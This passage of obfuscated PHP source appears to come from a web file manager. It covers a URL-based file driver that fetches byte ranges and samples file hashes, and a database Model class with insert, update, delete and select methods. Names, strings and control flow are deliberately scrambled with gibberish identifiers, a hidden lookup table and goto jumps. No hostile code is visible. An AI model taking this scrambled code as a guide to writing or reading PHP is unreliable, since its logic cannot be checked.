·¨í›); } public function isFile($B©„ù·ˆ) { return !$this->isFolder($B©„ù·ˆ) && $this->objectMeta($B©„ù·ˆ); } public function isFolder($d›ŠĞÈ…Ÿ£) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][232], $d›ŠĞÈ…Ÿ£); } protected function objectMeta($BšŠ„·†) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][233], $BšŠ„·†); } protected function _objectMeta($F÷¥ìšƒÙÂ) { goto F²İÚßÊ„œ; F²İÚßÊ„œ: $b·Øã˜ß“¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($F÷¥ìšƒÙÂ == $b·Øã˜ß“¤[33] || $F÷¥ìšƒÙÂ == $b·Øã˜ß“¤[8]) { return array(); } $eŞ æğí¢¬ = $this->ussRequest($F÷¥ìšƒÙÂ, $b·Øã˜ß“¤[1286]); goto Aì¯¬Ä²¢ğ; Fà‚Ó·Á¼‡: $Dãƒôì‘ËŠ = array($b·Øã˜ß“¤[28] => get_path_this($F÷¥ìšƒÙÂ), $b·Øã˜ß“¤[29] => isset($c²‘ğçŒ†[$b·Øã˜ß“¤[1287]]) ? $c²‘ğçŒ†[$b·Øã˜ß“¤[1287]] : null, $b·Øã˜ß“¤[87] => isset($c²‘ğçŒ†[$b·Øã˜ß“¤[1288]]) ? $c²‘ğçŒ†[$b·Øã˜ß“¤[1288]] : null, $b·Øã˜ß“¤[206] => isset($c²‘ğçŒ†[$b·Øã˜ß“¤[1289]]) ? $c²‘ğçŒ†[$b·Øã˜ß“¤[1289]] : null, $b·Øã˜ß“¤[1257] => isset($c²‘ğçŒ†[$b·Øã˜ß“¤[1290]]) ? $c²‘ğçŒ†[$b·Øã˜ß“¤[1290]] : null); $Dãƒôì‘ËŠ[$b·Øã˜ß“¤[1258]] = isset($c²‘ğçŒ†[$b·Øã˜ß“¤[1291]]) ? strtotime($c²‘ğçŒ†[$b·Øã˜ß“¤[1291]]) : $Dãƒôì‘ËŠ[$b·Øã˜ß“¤[1257]]; return $Dãƒôì‘ËŠ; goto Aïäø»…Ê¼; Aì¯¬Ä²¢ğ: if (!$eŞ æğí¢¬[$b·Øã˜ß“¤[1036]]) { return null; } $c²‘ğçŒ† = isset($eŞ æğí¢¬[$b·Øã˜ß“¤[1038]]) ? $eŞ æğí¢¬[$b·Øã˜ß“¤[1038]] : array(); if (!isset($c²‘ğçŒ†[$b·Øã˜ß“¤[1287]])) { return null; } goto Fà‚Ó·Á¼‡; Aïäø»…Ê¼: } protected function _isFolder($CÊ·Ÿ§µ) { $f´ÑÔèä¹Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($CÊ·Ÿ§µ == $f´ÑÔèä¹Ç[33] || $CÊ·Ÿ§µ == $f´ÑÔèä¹Ç[8]) { return !0; } $eÜòïğÒ²é = $this->objectMeta($CÊ·Ÿ§µ); return isset($eÜòïğÒ²é[$f´ÑÔèä¹Ç[29]]) && $eÜòïğÒ²é[$f´ÑÔèä¹Ç[29]] == $f´ÑÔèä¹Ç[86] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($B¤Í®ïíÊŸ = false) { } public function exist($dç”º†‡óÏ) { $bø ÚìÕ = $this->info($dç”º†‡óÏ); return $bø ÚìÕ[$_SERVER[¶ªÕß‚ØÁŸ][198]]; } public function isFile($fŞ³î»‘ê) { $a™†ÅˆÎóæ = $this->info($fŞ³î»‘ê); return $a™†ÅˆÎóæ[$_SERVER[¶ªÕß‚ØÁŸ][198]]; } public function isFolder($dÈ¦´ƒ®Å—) { return !1; } public function size($fñóä¬èĞŠ) { $f†ä’ËÔí¾ = $this->info($fñóä¬èĞŠ); return $f†ä’ËÔí¾[$_SERVER[¶ªÕß‚ØÁŸ][87]]; } public function info($B…ÈØî‹ “) { return $this->infoParse($B…ÈØî‹ “); } public function infoAuth($FÂ—·‹ïÃÁ) { return $this->infoParse($FÂ—·‹ïÃÁ); } public function infoWithChildren($Dò±ĞáƒÛ¾) { return $this->infoParse($Dò±ĞáƒÛ¾); } public function infoFull($bÃ÷‚³¢ö) { return $this->infoParse($bÃ÷‚³¢ö); } private function infoParse($f»–Ÿ¦ªÈ) { $A‚Â²ìŞÊ© =& $_SERVER[¶ªÕß‚ØÁŸ]; $cªÊœ‚™å = $this->header($f»–Ÿ¦ªÈ); if (!$cªÊœ‚™å || !$cªÊœ‚™å[$A‚Â²ìŞÊ©[702]]) { return !1; } $DÁì½áÖ™Å = _get($cªÊœ‚™å, $A‚Â²ìŞÊ©[334], 0); $dõŒä…‡¾Ï = array($A‚Â²ìŞÊ©[28] => $cªÊœ‚™å[$A‚Â²ìŞÊ©[28]], $A‚Â²ìŞÊ©[85] => $f»–Ÿ¦ªÈ, $A‚Â²ìŞÊ©[29] => $A‚Â²ìŞÊ©[177], $A‚Â²ìŞÊ©[87] => intval($DÁì½áÖ™Å), $A‚Â²ìŞÊ©[170] => get_path_ext($cªÊœ‚™å[$A‚Â²ìŞÊ©[28]]), $A‚Â²ìŞÊ©[1165] => $DÁì½áÖ™Å > 0 && $cªÊœ‚™å[$A‚Â²ìŞÊ©[1292]], $A‚Â²ìŞÊ©[1166] => !1); return $dõŒä…‡¾Ï; } private function header($D«äÃÙ³­Œ) { if (isset(self::$_cacheHeader[$D«äÃÙ³­Œ])) { return self::$_cacheHeader[$D«äÃÙ³­Œ]; } self::$_cacheHeader[$D«äÃÙ³­Œ] = url_header($D«äÃÙ³­Œ); return self::$_cacheHeader[$D«äÃÙ³­Œ]; } public function hashSimple($Bäçˆºôµö, $CëƒÇÌ‹£Ç = false) { goto bØ°°ä”; AĞµ†êÙÛÊ: $aÂ¦ŒòË´ = $Aª†ï³ğî¦[$F¿›Ç«‹Á—[87]]; $FàÅÇš„¿é = 200; $Eãà›ôˆÄÁ = 50; goto FÄĞÊŠ•òß; aÀğÒâæŒ‘: $d¢Õ–ø­ÑÜ .= $this->fileSubstr($Bäçˆºôµö, $aÂ¦ŒòË´ - $FàÅÇš„¿é, $FàÅÇš„¿é); return md5($d¢Õ–ø­ÑÜ) . $aÂ¦ŒòË´; goto dÏ©‹°Ì‚Ù; FÄĞÊŠ•òß: if ($aÂ¦ŒòË´ <= $FàÅÇš„¿é * $Eãà›ôˆÄÁ) { return md5($this->fileSubstr($Bäçˆºôµö, 0, $aÂ¦ŒòË´)) . $aÂ¦ŒòË´; } $AŠÙ¶šŠ”ˆ = intval($aÂ¦ŒòË´ / $Eãà›ôˆÄÁ); $d¢Õ–ø­ÑÜ = $F¿›Ç«‹Á—[33]; goto F„ºË˜È»•; bØ°°ä”: $F¿›Ç«‹Á— =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aª†ï³ğî¦ = $this->info($Bäçˆºôµö); if (!$Aª†ï³ğî¦ || !$Aª†ï³ğî¦[$F¿›Ç«‹Á—[198]]) { return !1; } goto AĞµ†êÙÛÊ; F„ºË˜È»•: $Bó×ªÎğé  = timeFloat(); $cµ½¯Êğè™ = 15; for ($E™»çÙ‹ = 0; $E™»çÙ‹ < $Eãà›ôˆÄÁ; $E™»çÙ‹++) { if (timeFloat() - $Bó×ªÎğé  > $cµ½¯Êğè™) { return !1; } $dÌÉ¿±š¿é = $this->fileSubstr($Bäçˆºôµö, $AŠÙ¶šŠ”ˆ * $E™»çÙ‹, $FàÅÇš„¿é); if (!$dÌÉ¿±š¿é) { return !1; } $d¢Õ–ø­ÑÜ .= $dÌÉ¿±š¿é; } goto aÀğÒâæŒ‘; dÏ©‹°Ì‚Ù: } public function getContent($bõ‹öËÚÀ) { return $this->fileSubstr($bõ‹öËÚÀ); } public function fileSubstr($C³«¦ÚøĞˆ, $Aéš£Ôø„” = 0, $D£îÃßãÕ˜ = -1) { goto aÅ±³îí¸È; B—İ»‰à‘œ: if ($D£îÃßãÕ˜ === -1) { $D£îÃßãÕ˜ = $bÅÆ¯ß‘ëÓ[$cçïÁ‘›õí[87]]; } if ($D£îÃßãÕ˜ == 0) { return $cçïÁ‘›õí[33]; } $fİ¶–Œø®Ç = array($cçïÁ‘›õí[1293] . $Aéš£Ôø„” . $cçïÁ‘›õí[729] . ($Aéš£Ôø„” + $D£îÃßãÕ˜ - 1)); goto C”œëª¿¯Ú; C”œëª¿¯Ú: $A¦ŒİğÇ…‰ = url_request($C³«¦ÚøĞˆ, $cçïÁ‘›õí[226], !1, $fİ¶–Œø®Ç, !1, !1, 1); return $A¦ŒİğÇ…‰[$cçïÁ‘›õí[1038]] ? $A¦ŒİğÇ…‰[$cçïÁ‘›õí[1038]] : $cçïÁ‘›õí[33]; goto c¸Òä¼ğ¨; aÅ±³îí¸È: $cçïÁ‘›õí =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÅÆ¯ß‘ëÓ = $this->info($C³«¦ÚøĞˆ); if (!$bÅÆ¯ß‘ëÓ || !$bÅÆ¯ß‘ëÓ[$cçïÁ‘›õí[198]] && $bÅÆ¯ß‘ëÓ[$cçïÁ‘›õí[87]] > 1024 * 1024 * 10) { return !1; } goto B—İ»‰à‘œ; c¸Òä¼ğ¨: } public function download($f¸ÜĞ‡†À, $dÒŠŸÉê™) { Downloader::start($f¸ÜĞ‡†À, $dÒŠŸÉê™); return $dÒŠŸÉê™; } } goto A½ê‚®áó°; FÅÂ°ªøºî: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\x6f\x72\144\x65\162", "\141\x6c\151\141\x73", "\x68\x61\166\151\156\x67", "\x67\x72\157\x75\x70", "\154\x6f\x63\153", "\144\x69\163\x74\151\156\x63\x74", "\x61\165\x74\x6f", "\x66\151\x6c\x74\145\x72", "\x76\x61\x6c\151\144\141\164\145", "\162\x65\163\165\x6c\164", "\x62\x69\x6e\144", "\x74\x6f\x6b\x65\x6e"); public function __construct($aÉèŠÑõÂÊ = '', $f§„´‘‡ = '', $Fƒˆ¬­õš = '') { $Dªƒêñƒ– =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->_initialize(); if (!empty($aÉèŠÑõÂÊ)) { if (strpos($aÉèŠÑõÂÊ, $Dªƒêñƒ–[101])) { list($this->dbName, $this->name) = explode($Dªƒêñƒ–[101], $aÉèŠÑõÂÊ); } else { $this->name = $aÉèŠÑõÂÊ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($f§„´‘‡)) { $this->tablePrefix = $Dªƒêñƒ–[33]; } elseif ($Dªƒêñƒ–[33] != $f§„´‘‡) { $this->tablePrefix = $f§„´‘‡; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Dªƒêñƒ–[241]); } $this->db(0, empty($this->connection) ? $Fƒˆ¬­õš : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $BÊˆ™¶ÕØ» =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($this->fields)) { if (think_config($BÊˆ™¶ÕØ»[242])) { $EÀÜÎ­®¬Ô = $this->dbName ? $this->dbName : think_config($BÊˆ™¶ÕØ»[243]); $b”ˆ†Ö¾åÒ = think_var_cache($BÊˆ™¶ÕØ»[244] . strtolower(get_path_this($EÀÜÎ­®¬Ô) . $BÊˆ™¶ÕØ»[101] . $this->name)); if ($b”ˆ†Ö¾åÒ) { $e×Ë›¹¶ = think_config($BÊˆ™¶ÕØ»[245]); if (empty($e×Ë›¹¶) || $b”ˆ†Ö¾åÒ[$BÊˆ™¶ÕØ»[246]] == $e×Ë›¹¶) { $this->fields = $b”ˆ†Ö¾åÒ; return; } } } $this->flush(); } } public function flush() { goto c¸ÒÖÔî¬Û; c¸ÒÖÔî¬Û: $EÌğµ”÷İí =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->db->setModel($this->name); $BÌÊè˜×Á¬ = $this->db->getFields($this->getTableName()); goto F´‹Ûá•’›; c‹ßÙ‘–†î: if (think_config($EÌğµ”÷İí[242])) { $Bæö°ŸÎÈ± = $this->dbName ? $this->dbName : think_config($EÌğµ”÷İí[243]); think_var_cache($EÌğµ”÷İí[244] . strtolower(get_path_this($Bæö°ŸÎÈ±) . $EÌğµ”÷İí[101] . $this->name), $this->fields); } goto DÈÄö›Ü‡À; F´‹Ûá•’›: if (!$BÌÊè˜×Á¬) { return !1; } $this->fields = array_keys($BÌÊè˜×Á¬); $this->fields[$EÌğµ”÷İí[247]] = !1; goto B·½„íæäë; B·½„íæäë: foreach ($BÌÊè˜×Á¬ as $c—Èáïª¢Š => $CÇîÓë¹†Ï) { $D¯ÔŠÁ´‰ò[$c—Èáïª¢Š] = $CÇîÓë¹†Ï[$EÌğµ”÷İí[29]]; if ($CÇîÓë¹†Ï[$EÌğµ”÷İí[36]]) { $this->fields[$EÌğµ”÷İí[248]] = $c—Èáïª¢Š; if ($CÇîÓë¹†Ï[$EÌğµ”÷İí[39]]) { $this->fields[$EÌğµ”÷İí[247]] = !0; } } } $this->fields[$EÌğµ”÷İí[249]] = $D¯ÔŠÁ´‰ò; if (think_config($EÌğµ”÷İí[245])) { $this->fields[$EÌğµ”÷İí[246]] = think_config($EÌğµ”÷İí[245]); } goto c‹ßÙ‘–†î; DÈÄö›Ü‡À: } public function switchModel($b•¦ã„­‰Ô, $Dƒ¹²¶¢² = array()) { $AÖğØŞ¹‡Í =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÍö­œá˜¿ = ucwords(strtolower($b•¦ã„­‰Ô)) . $AÖğØŞ¹‡Í[250]; if (!class_exists($bÍö­œá˜¿)) { think_exception($bÍö­œá˜¿ . think_lang($AÖğØŞ¹‡Í[251])); } $this->_extModel = new $bÍö­œá˜¿($this->name); if (!empty($Dƒ¹²¶¢²)) { foreach ($Dƒ¹²¶¢² as $B—©¨…¨ˆ) { $this->_extModel->setProperty($B—©¨…¨ˆ, $this->{$B—©¨…¨ˆ}); } } return $this->_extModel; } public function __set($Fï­Îä´Œ¶, $f™»ãÇ†ˆ) { $this->data[$Fï­Îä´Œ¶] = $f™»ãÇ†ˆ; } public function __get($Dªº‘¶äµ) { return isset($this->data[$Dªº‘¶äµ]) ? $this->data[$Dªº‘¶äµ] : null; } public function __isset($F¤Ğ‰ªøŸÆ) { return isset($this->data[$F¤Ğ‰ªøŸÆ]); } public function __unset($CÄ‹ÛèÂù) { unset($this->data[$CÄ‹ÛèÂù]); } public function __call($D«­ÔÙ‡†Ö, $b†¤â©÷Ü¹) { $Dˆ…É†Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; if (in_array(strtolower($D«­ÔÙ‡†Ö), $this->methods, !0)) { $this->options[strtolower($D«­ÔÙ‡†Ö)] = $b†¤â©÷Ü¹[0]; return $this; } elseif (in_array(strtolower($D«­ÔÙ‡†Ö), array($Dˆ…É†Ç[252], $Dˆ…É†Ç[253], $Dˆ…É†Ç[254], $Dˆ…É†Ç[255], $Dˆ…É†Ç[256]), !0)) { $EâŒ­ëä„„ = isset($b†¤â©÷Ü¹[0]) ? $b†¤â©÷Ü¹[0] : $Dˆ…É†Ç[186]; $EâŒ­ëä„„ = $this->db->parseKey($EâŒ­ëä„„); return $this->getField(strtoupper($D«­ÔÙ‡†Ö) . $Dˆ…É†Ç[257] . $EâŒ­ëä„„ . $Dˆ…É†Ç[258] . $D«­ÔÙ‡†Ö, $Dˆ…É†Ç[252]); } elseif (strtolower(substr($D«­ÔÙ‡†Ö, 0, 5)) == $Dˆ…É†Ç[259]) { $EâŒ­ëä„„ = think_parse_name(substr($D«­ÔÙ‡†Ö, 5)); $fˆî‰ŠÅöÌ[$EâŒ­ëä„„] = $b†¤â©÷Ü¹[0]; return $this->where($fˆî‰ŠÅöÌ)->find(); } elseif (strtolower(substr($D«­ÔÙ‡†Ö, 0, 10)) == $Dˆ…É†Ç[260]) { $DÀ†¼É©Ğß = think_parse_name(substr($D«­ÔÙ‡†Ö, 10)); $fˆî‰ŠÅöÌ[$DÀ†¼É©Ğß] = $b†¤â©÷Ü¹[0]; return $this->where($fˆî‰ŠÅöÌ)->getField($b†¤â©÷Ü¹[1]); } elseif (isset($this->_scope[$D«­ÔÙ‡†Ö])) { return $this->scope($D«­ÔÙ‡†Ö, $b†¤â©÷Ü¹[0]); } elseif (method_exists($this, $D«­ÔÙ‡†Ö)) { array_unshift($b†¤â©÷Ü¹, $D«­ÔÙ‡†Ö); return call_user_func_array(array($this, $Dˆ…É†Ç[261]), $b†¤â©÷Ü¹); } else { return call_user_func_array(array(parent, $D«­ÔÙ‡†Ö), $b†¤â©÷Ü¹); } } protected function call() { goto D¾ğ–Èó²é; d¤ò“²ä¹: $E¿ŸÜõ†ğ© = call_user_func_array(array($this, $f«‰ø¥ ™), $eøß×êùÅ); if (method_exists($this, $aÑÊ˜ÍÃ£[265])) { $fï—Ùİ‰½Ğ = call_user_func_array(array($this, $aÑÊ˜ÍÃ£[266]), array($F«ÆÙà‘ø, $eøß×êùÅ, $E¿ŸÜõ†ğ©)); if ($fï—Ùİ‰½Ğ) { return $fï—Ùİ‰½Ğ; } } return $E¿ŸÜõ†ğ©; goto BàÌ°ã÷‡; FÜ÷Œ¯±¤Ş: if (isset($eøß×êùÅ[$E¨ŒÓº»¥]) && $eøß×êùÅ[$E¨ŒÓº»¥] === $f«‰ø¥ ™) { think_exception(__CLASS__ . $aÑÊ˜ÍÃ£[4] . $f«‰ø¥ ™ . think_lang($aÑÊ˜ÍÃ£[262])); return; } $eøß×êùÅ[] = $f«‰ø¥ ™; if (method_exists($this, $aÑÊ˜ÍÃ£[263])) { $fï—Ùİ‰½Ğ = call_user_func_array(array($this, $aÑÊ˜ÍÃ£[264]), array($F«ÆÙà‘ø, $eøß×êùÅ)); if (!is_null($fï—Ùİ‰½Ğ) && $fï—Ùİ‰½Ğ !== !1) { return $fï—Ùİ‰½Ğ; } } goto d¤ò“²ä¹; D¾ğ–Èó²é: $aÑÊ˜ÍÃ£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eøß×êùÅ = func_get_args(); $f«‰ø¥ ™ = array_shift($eøß×êùÅ); goto AñËŠ¶Ã‡; AñËŠ¶Ã‡: $F«ÆÙà‘ø = $f«‰ø¥ ™; if (is_array($f«‰ø¥ ™)) { $F«ÆÙà‘ø = $f«‰ø¥ ™[1]; $f«‰ø¥ ™ = $f«‰ø¥ ™[0]; } $E¨ŒÓº»¥ = count($eøß×êùÅ) - 1; goto FÜ÷Œ¯±¤Ş; BàÌ°ã÷‡: } protected function _initialize() { } protected function _facade($eÜî“äâÖ”) { $cİÈªÁùîÇ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!empty($this->fields)) { foreach ($eÜî“äâÖ” as $A„ˆêì«½® => $Føöè‰Ó§) { if (!in_array($A„ˆêì«½®, $this->fields, !0)) { unset($eÜî“äâÖ”[$A„ˆêì«½®]); } elseif (is_scalar($Føöè‰Ó§)) { $this->_parseType($eÜî“äâÖ”, $A„ˆêì«½®); } } } if (!empty($this->options[$cİÈªÁùîÇ[267]])) { $eÜî“äâÖ” = array_map($this->options[$cİÈªÁùîÇ[267]], $eÜî“äâÖ”); unset($this->options[$cİÈªÁùîÇ[267]]); } $this->_beforeWrite($eÜî“äâÖ”); return $eÜî“äâÖ”; } protected function _beforeWrite(&$D¹â‘¶ö¼¨) { } public function add($fäŒ‘Ü†ÒÊ = '', $fœ¶–¥îÖĞ = array(), $DÑ«íá©‰ = false) { goto D¼šÀ¼Ëìï; BîŸÕÉ­Çé: if (!1 === $this->_beforeInsert($fäŒ‘Ü†ÒÊ, $fœ¶–¥îÖĞ)) { return !1; } $f„šÍ°ÙÒš = $this->db->insert($fäŒ‘Ü†ÒÊ, $fœ¶–¥îÖĞ, $DÑ«íá©‰); if (!1 !== $f„šÍ°ÙÒš) { $aÖ¢‰à¨ = $this->getLastInsID(); if ($aÖ¢‰à¨) { $fäŒ‘Ü†ÒÊ[$this->getPk()] = $aÖ¢‰à¨; $this->_after_insert($fäŒ‘Ü†ÒÊ, $fœ¶–¥îÖĞ); return $aÖ¢‰à¨; } $this->_after_insert($fäŒ‘Ü†ÒÊ, $fœ¶–¥îÖĞ); } goto eŸÆ–ì‘­; eŸÆ–ì‘­: return $f„šÍ°ÙÒš; goto FÖŞò‚ß–¿; D¼šÀ¼Ëìï: if (empty($fäŒ‘Ü†ÒÊ)) { if (!empty($this->data)) { $fäŒ‘Ü†ÒÊ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¶ªÕß‚ØÁŸ][268]); return !1; } } $fœ¶–¥îÖĞ = $this->_parseOptions($fœ¶–¥îÖĞ); $fäŒ‘Ü†ÒÊ = $this->_facade($fäŒ‘Ü†ÒÊ); goto BîŸÕÉ­Çé; FÖŞò‚ß–¿: } protected function _beforeInsert(&$A¦ÂáÂĞ‚, $EãáÁˆ¼Ğ) { } protected function _after_insert($dùÌ¿Ü¨, $A‹À×× Èí) { } public function addAll($DåÀ¤ÃÒ¹, $bÙİ‹‚‚Õ­ = array(), $A†òÖš†š¬ = false) { goto D÷ÈĞŠ´ºé; a™ÁğÕ‰ùÏ: return $F»Şí õÒÈ; goto e¸¡»´ÎÆ; D÷ÈĞŠ´ºé: $f…ÄÒ‘ÃË¾ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($DåÀ¤ÃÒ¹)) { $this->error = think_lang($f…ÄÒ‘ÃË¾[268]); return !1; } $bÙİ‹‚‚Õ­ = $this->_parseOptions($bÙİ‹‚‚Õ­); goto a¶­Í—¬ƒ—; a¶­Í—¬ƒ—: foreach ($DåÀ¤ÃÒ¹ as $bĞÁùğŞªÀ => $fã±× ‘äù) { $DåÀ¤ÃÒ¹[$bĞÁùğŞªÀ] = $this->_facade($fã±× ‘äù); } if (method_exists($this->db, $f…ÄÒ‘ÃË¾[269])) { $F»Şí õÒÈ = $this->db->insertAll($DåÀ¤ÃÒ¹, $bÙİ‹‚‚Õ­, $A†òÖš†š¬); } else { $this->startTrans(); foreach ($DåÀ¤ÃÒ¹ as $bĞÁùğŞªÀ => $fã±× ‘äù) { $F»Şí õÒÈ = $this->db->insert($fã±× ‘äù, $bÙİ‹‚‚Õ­, $A†òÖš†š¬); } $this->commit(); } if (!1 !== $F»Şí õÒÈ) { $dŒŞˆ‰³‰¬ = $this->getLastInsID(); if ($dŒŞˆ‰³‰¬) { return $dŒŞˆ‰³‰¬; } } goto a™ÁğÕ‰ùÏ; e¸¡»´ÎÆ: } public function selectAdd($f¾µÂì‡è¹ = '', $Aó¥»êÎ‡ï = '', $Aâ³“ÇÏµÖ = array()) { $CäœÌë«ï‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aâ³“ÇÏµÖ = $this->_parseOptions($Aâ³“ÇÏµÖ); if (!1 === ($dï‘¥Ì¹¨ = $this->db->selectInsert($f¾µÂì‡è¹ ? $f¾µÂì‡è¹ : $Aâ³“ÇÏµÖ[$CäœÌë«ï‡[270]], $Aó¥»êÎ‡ï ? $Aó¥»êÎ‡ï : $this->getTableName(), $Aâ³“ÇÏµÖ))) { $this->error = think_lang($CäœÌë«ï‡[271]); return !1; } else { return $dï‘¥Ì¹¨; } } public function save($Bë¦À´é® = '', $E†¾•’–Ù— = array()) { goto e¿‘¡ä ï; e¿‘¡ä ï: $Fñ¥×Š›ê =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($Bë¦À´é®)) { if (!empty($this->data)) { $Bë¦À´é® = $this->data; $this->data = array(); } else { $this->error = think_lang($Fñ¥×Š›ê[268]); return !1; } } $Bë¦À´é® = $this->_facade($Bë¦À´é®); goto fŠµöÕÉ™; aÆÃïÍ”ğ¡: if (is_array($E†¾•’–Ù—[$Fñ¥×Š›ê[272]]) && isset($E†¾•’–Ù—[$Fñ¥×Š›ê[272]][$CÎåÉªîæ¶])) { $eæÖ¬÷»‰‰ = $E†¾•’–Ù—[$Fñ¥×Š›ê[272]][$CÎåÉªîæ¶]; } if (!1 === $this->_beforeUpdate($Bë¦À´é®, $E†¾•’–Ù—)) { return !1; } $Aø–ìÄç¾« = $this->db->update($Bë¦À´é®, $E†¾•’–Ù—); goto eª›äİŠªå; eª›äİŠªå: if (!1 !== $Aø–ìÄç¾«) { if (isset($eæÖ¬÷»‰‰)) { $Bë¦À´é®[$CÎåÉªîæ¶] = $eæÖ¬÷»‰‰; } $this->_afterUpdate($Bë¦À´é®, $E†¾•’–Ù—); } return $Aø–ìÄç¾«; goto b„»‚Æ‡Š; fŠµöÕÉ™: $E†¾•’–Ù— = $this->_parseOptions($E†¾•’–Ù—); $CÎåÉªîæ¶ = $this->getPk(); if (!isset($E†¾•’–Ù—[$Fñ¥×Š›ê[272]])) { if (isset($Bë¦À´é®[$CÎåÉªîæ¶])) { $Cæ°ŞÂœ“[$CÎåÉªîæ¶] = $Bë¦À´é®[$CÎåÉªîæ¶]; $E†¾•’–Ù—[$Fñ¥×Š›ê[272]] = $Cæ°ŞÂœ“; unset($Bë¦À´é®[$CÎåÉªîæ¶]); } else { $this->error = think_lang($Fñ¥×Š›ê[271]); return !1; } } goto aÆÃïÍ”ğ¡; b„»‚Æ‡Š: } protected function _beforeUpdate(&$B´¡³¤²…², $dÀÎõ®Ÿ“) { } protected function _afterUpdate($D²Æ¿‘Ç‡, $F×‘øƒ¿†) { } public function delete($AƒåŒÏ—Õ = array()) { goto fÍ•¸õ‚§é; a²•†øªŒ: $dî‚ÌàìÀ = $this->db->delete($AƒåŒÏ—Õ); if (!1 !== $dî‚ÌàìÀ) { $b‚ä„éà = array(); if (isset($bØøø‰ƒíï)) { $b‚ä„éà[$a²Î¶óÉ¸×] = $bØøø‰ƒíï; } $this->_after_delete($b‚ä„éà, $AƒåŒÏ—Õ); } return $dî‚ÌàìÀ; goto C‚…ùÚ°Û¹; fÍ•¸õ‚§é: $F¡¸ØË»ÕÍ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($AƒåŒÏ—Õ) && empty($this->options[$F¡¸ØË»ÕÍ[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $a²Î¶óÉ¸× = $this->getPk(); goto B†©Æ­È»ˆ; B†©Æ­È»ˆ: if (is_numeric($AƒåŒÏ—Õ) || is_string($AƒåŒÏ—Õ)) { if (strpos($AƒåŒÏ—Õ, $F¡¸ØË»ÕÍ[47])) { $c°‹×’¾†[$a²Î¶óÉ¸×] = array($F¡¸ØË»ÕÍ[273], $AƒåŒÏ—Õ); } else { $c°‹×’¾†[$a²Î¶óÉ¸×] = $AƒåŒÏ—Õ; } $this->options[$F¡¸ØË»ÕÍ[272]] = $c°‹×’¾†; } $AƒåŒÏ—Õ = $this->_parseOptions(); if (is_array($AƒåŒÏ—Õ[$F¡¸ØË»ÕÍ[272]]) && isset($AƒåŒÏ—Õ[$F¡¸ØË»ÕÍ[272]][$a²Î¶óÉ¸×])) { $bØøø‰ƒíï = $AƒåŒÏ—Õ[$F¡¸ØË»ÕÍ[272]][$a²Î¶óÉ¸×]; } goto a²•†øªŒ; C‚…ùÚ°Û¹: } protected function _after_delete($aà£®Â‰¢¯, $e‹¨ÁÙ…‹) { } public function select($D—®’ø•ŸŒ = array()) { goto bà²É‡Œ¿¹; Bİ°¦’Û»ƒ: $this->_afterSelect($CñÜøèêè, $D—®’ø•ŸŒ); return $CñÜøèêè; goto F¡Ù„«„Ä; bà²É‡Œ¿¹: $Bˆ´°ßÆŠ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_string($D—®’ø•ŸŒ) || is_numeric($D—®’ø•ŸŒ)) { $dÇãÅ†«øÍ = $this->getPk(); if (strpos($D—®’ø•ŸŒ, $Bˆ´°ßÆŠ[47])) { $c†Ôù¦Ç¶Ü[$dÇãÅ†«øÍ] = array($Bˆ´°ßÆŠ[273], $D—®’ø•ŸŒ); } else { $c†Ôù¦Ç¶Ü[$dÇãÅ†«øÍ] = $D—®’ø•ŸŒ; } $this->options[$Bˆ´°ßÆŠ[272]] = $c†Ôù¦Ç¶Ü; } elseif (!1 === $D—®’ø•ŸŒ) { $D—®’ø•ŸŒ = $this->_parseOptions(); return $Bˆ´°ßÆŠ[274] . $this->db->buildSelectSql($D—®’ø•ŸŒ) . $Bˆ´°ßÆŠ[275]; } $D—®’ø•ŸŒ = $this->_parseOptions(); goto CÁÎÊŠ©¦İ; CÁÎÊŠ©¦İ: $CñÜøèêè = $this->db->select($D—®’ø•ŸŒ); if (!1 === $CñÜøèêè) { return !1; } if (empty($CñÜøèêè)) { return null; } goto Bİ°¦’Û»ƒ; F¡Ù„«„Ä: } protected function _afterSelect(&$F‡ª†ó­Ò¾, $f‘«ó¡Ã¯ê) { } public function buildSql($EĞÀÂá©Ùš = array()) { $EŒ¹ãµ£Ù =& $_SERVER[¶ªÕß‚ØÁŸ]; $EĞÀÂá©Ùš = $this->_parseOptions($EĞÀÂá©Ùš); return $EŒ¹ãµ£Ù[274] . $this->db->buildSelectSql($EĞÀÂá©Ùš) . $EŒ¹ãµ£Ù[275]; } public function optionsValue($AÔ£öÈ  = null) { if (is_null($AÔ£öÈ )) { return $this->options; } elseif (is_array($AÔ£öÈ )) { $this->options = array_merge($this->options, $AÔ£öÈ ); } } protected function _parseOptions($Eö«¿†Ô­× = array()) { goto DİÑ…õğŞ–; Bˆ¦™Á‹á’: if (isset($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[272]]) && 